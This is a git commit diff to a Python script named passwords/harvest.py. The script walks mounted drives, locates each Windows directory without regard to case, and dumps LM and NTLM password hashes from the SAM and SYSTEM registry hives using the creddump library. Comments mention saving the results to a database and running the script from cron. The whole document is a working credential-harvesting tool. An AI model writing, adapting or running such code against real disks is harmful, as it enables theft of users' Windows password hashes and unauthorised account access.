7f27263b67a06822dc00eeda8e119c117aade74d
Admiral <admiral@ci-main.no-ip.org>
2016-03-07 10:28:46 -0500

    sets up windows directory as Case Insensitive

--- passwords/harvest.py
+++ passwords/harvest.py
@@ -5,22 +5,24 @@ sys.path.append("/usr/share/creddump/")
 from framework.win32.hashdump import dump_file_hashes
 
 datapath='/media/data/'
-hive_path='/WINDOWS/system32/config'
-target=["/SAM", "/system", "/SECURITY"]
+hive_path='/windows/system32/config'
+target=["/system32/config/SAM", "/system32/config/system", "/SECURITY"]
 
 # scrape out base path for the HDD
-dirnames = [name for name in os.listdir(datapath) if os.path.isdir(os.path.join(datapath, name))]
+drives = [name for name in os.listdir(datapath) if os.path.isdir(os.path.join(datapath, name))]
 
 # Attach "Windows/system32/config" for the extended name
 # Start pulling SAM, SYSTEM, SECURITY hives for the hash scraper
-for name in dirnames:
-	hive=datapath + name + hive_path
-	try:
-#		print "DEBUG: SYSTEM = %s SAM = %s" % (hive+target[1],hive+target[0])
-		dump_file_hashes(hive+target[1], hive+target[0])
-	except IOError as e:
-#		print e
-		print ""
+for d in drives:
+	base=datapath + d
+	dirs = [name for name in os.listdir(base) if os.path.isdir(os.path.join(base, name))]
+	for win in dirs:
+		if win.lower() == 'windows':
+			try:
+#				print "DEBUG: SYSTEM = %s SAM = %s" % (base+'/'+win+target[1],base+'/'+win+target[0])
+				dump_file_hashes(base+'/'+win+target[1], base+'/'+win+target[0])
+			except IOError as e:
+				print e
 # Save directory name to avoid duplicates (cron tab prep)
 
 # Output data to Database (<username>:<uid>:<LM-hash>:<NTLM-hash>:<comment>:<homedir>:)
